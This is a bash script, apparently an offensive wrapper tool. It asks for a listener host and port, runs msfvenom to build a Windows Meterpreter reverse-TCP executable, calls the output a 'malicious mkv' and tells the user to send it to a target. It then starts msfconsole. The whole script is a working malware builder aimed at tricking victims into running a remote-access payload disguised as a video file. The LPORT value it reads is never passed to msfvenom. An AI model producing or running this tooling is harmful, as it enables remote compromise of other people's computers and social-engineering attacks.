#!/bin/bash

# Developer Information
echo '#############################################################'
echo '#                      DEVELOPER INFO                       #'
echo '#############################################################'
echo '#                                                           #'
echo '#   Script created by: Sayaem Arafat                        #'
echo '#   Github: https://github.com/<your_github_username>       #'
echo '#                                                           #'
echo '#############################################################'
echo ''

# Display tool description
echo '  __  __  ____  _  _  ____  ____   __    ___  __  __  ____ '
echo ' (  \/  )(  _ \/ )( \(  _ \(  _ \ / _\  / __)(  )(  )(  _ \'
echo '  )    (  ) __/) \/ ( )   / ) __//    \( (__  )(__)(  ) _/'
echo ' (_/\/\_)(__)  \____/(__\_)(__)  \_/\_/ \___)(______)(____)'
echo ' '
echo 'A tool to hack Windows via exe....'

# Prompt user for LHOST and LPORT
echo 'Enter your LHOST:'
read LHOST
echo 'Enter your LPORT:'
read LPORT

# Generate malicious mkv
echo 'Going to generate a malicious mkv...'
echo 'Enter the name of your malicious mkv:'
read exe

# Use msfvenom to create malicious executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST -f exe -o $exe

# Inform user about the generated malicious mkv
echo "$exe generated in your home directory. Send the malicious mkv to your target..."

# Clear screen after 5 seconds
echo 'Clearing the screen...'
sleep 5
clear

# Start Metasploit Framework Console
echo 'Starting Metasploit Framework Console (msfconsole)...'
msfconsole
